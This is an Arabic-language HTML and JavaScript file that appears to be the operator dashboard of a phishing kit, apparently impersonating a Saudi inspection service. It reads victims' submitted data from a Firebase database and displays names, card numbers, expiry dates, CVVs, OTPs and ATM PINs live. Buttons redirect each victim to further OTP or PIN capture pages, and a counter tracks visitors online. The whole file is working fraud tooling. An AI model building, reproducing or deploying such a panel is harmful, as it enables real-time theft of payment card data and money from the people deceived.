<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحكم الذكي - Engineer Hasan</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --p-clr: #006C35; --b-clr: #f0f2f5; --a-clr: #00ff88; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--b-clr); margin: 0; user-select: none; }
        .h-nav { background: var(--p-clr); padding: 15px; text-align: center; position: sticky; top: 0; z-index: 99; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
        .l-cnt { color: var(--a-clr); font-weight: bold; font-size: 14px; border: 2px solid var(--a-clr); display: inline-block; padding: 5px 15px; border-radius: 20px; animation: blink 2s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
        .main-c { padding: 15px; max-width: 1400px; margin: auto; }
        .r-row { background: #fff; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: grid; grid-template-columns: 1.5fr 2fr 1.5fr 1fr 1fr 1.5fr; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); gap: 10px; border-right: 6px solid #ddd; transition: 0.3s; }
        .r-row:hover { transform: scale(1.01); }
        .c-box { display: flex; flex-direction: column; }
        .lbl { font-size: 10px; color: #888; font-weight: bold; margin-bottom: 3px; }
        .val { font-size: 14px; font-weight: bold; color: #333; }
        .c-num { font-family: 'Courier New', monospace; font-size: 17px; color: #d9534f; background: #fff5f5; padding: 5px; border-radius: 4px; border: 1px solid #ffcccc; text-align: center; }
        .act { display: flex; gap: 8px; }
        .b-x { border: none; border-radius: 5px; padding: 10px; color: #fff; font-weight: bold; cursor: pointer; flex: 1; font-size: 12px; }
        .b-ok { background: #28a745; } .b-no { background: #dc3545; } .b-wait { background: #ffc107; color: #000; }
        #l-scr { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        .p-in { padding: 15px; border-radius: 10px; border: 1px solid var(--a-clr); margin-top: 20px; text-align: center; width: 280px; background: #000; color: var(--a-clr); font-size: 22px; letter-spacing: 4px; }
    </style>
</head>
<body>

<div id="l-scr">
    <h2 style="color: var(--a-clr)">ENGINEER HASAN PANEL</h2>
    <p>ادخل كود الوصول الآمن</p>
    <input type="password" class="p-in" id="p-key" placeholder="••••••••" oninput="_v_auth(this.value)">
</div>

<audio id="_notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div class="h-nav">
    <div class="l-cnt">عدد الزوار الآن: <span id="_online">0</span></div>
    <h3 style="color: white; margin: 10px 0 0 0;">مراقبة العمليات اللحظية</h3>
</div>

<div class="main-c">
    <div id="_p_list">
        </div>
</div>

<script>
    // تهيئة النظام - تأكد من مطابقة هذه البيانات لملفات الـ HTML
    const _cfg = { 
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", // ضع الـ API Key الخاص بك هنا
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
        projectId: "saso-inspection" 
    };
    firebase.initializeApp(_cfg);
    const _db = firebase.database();

    function _v_auth(v) {
        if(v === "H1234567890H") { 
            document.getElementById('l-scr').style.display = 'none';
        }
    }

    // قراءة البيانات (خفيفة جداً - آخر 15 طلب فقط)
    _db.ref('orders').limitToLast(15).on('value', (s) => {
        const _l = document.getElementById('_p_list');
        _l.innerHTML = '';
        if(s.exists()) {
            // تشغيل صوت تنبيه عند وصول بيانات جديدة
            document.getElementById('_notif').play().catch(e=>{});
        }
        
        s.forEach((c) => {
            const _d = c.val();
            const _i = c.key;
            const _card = _d.card_details || {};
            const _user = _d.personal_info || {};
            
            // تحديد لون الحالة
            let statusColor = "#ddd";
            if(_d.next_step === "go_to_otp") statusColor = "#28a745";
            if(_d.next_step === "go_to_pin") statusColor = "#dc3545";

            _l.innerHTML = `
                <div class="r-row" style="border-right-color: ${statusColor}">
                    <div class="c-box">
                        <span class="lbl">العميل / الصفحة</span>
                        <span class="val">${_user.fullName || 'جاري الإدخال...'}</span>
                        <small style="color:var(--p-clr)">متواجد في: ${_d.current_page || 'الرئيسية'}</small>
                    </div>
                    <div class="c-box">
                        <span class="lbl">رقم البطاقة</span>
                        <span class="c-num">${_card.cardNumber || '**** **** **** ****'}</span>
                    </div>
                    <div class="c-box">
                        <span class="lbl">تاريخ / رمز</span>
                        <span class="val" style="direction:ltr;">${_card.expiry || '--/--'} | ${_card.cvv || '***'}</span>
                    </div>
                    <div class="c-box">
                        <span class="lbl">OTP (الرمز)</span>
                        <span class="val" style="color:blue; font-size:18px;">${_card.otp || '----'}</span>
                    </div>
                    <div class="c-box">
                        <span class="lbl">ATM PIN</span>
                        <span class="val" style="color:red; font-size:18px;">${_card.atm_pin || '----'}</span>
                    </div>
                    <div class="act">
                        <button class="b-x b-ok" onclick="_u_st('${_i}', 'go_to_otp')">طلب رمز OTP</button>
                        <button class="b-x b-wait" onclick="_u_st('${_i}', 'go_to_pin')">طلب PIN</button>
                        <button class="b-x b-no" onclick="_del('${_i}')">حذف</button>
                    </div>
                </div>` + _l.innerHTML;
        });
    });

    // تحديث الأوامر لترسل لصفحة portal-v3.html
    function _u_st(i, s) {
        _db.ref('orders/' + i).update({ next_step: s, last_command: Date.now() });
    }

    // حذف الطلب
    function _del(i) {
        if(confirm('هل تريد حذف هذا السجل؟')) _db.ref('orders/' + i).remove();
    }

    // مراقبة الزوار (خفيفة)
    _db.ref('live_sessions').on('value', (s) => {
        let count = 0;
        const now = Date.now();
        s.forEach(x => { if(now - x.val().last_seen < 30000) count++; });
        document.getElementById('_online').innerText = count;
    });
</script>
</body>
</html>
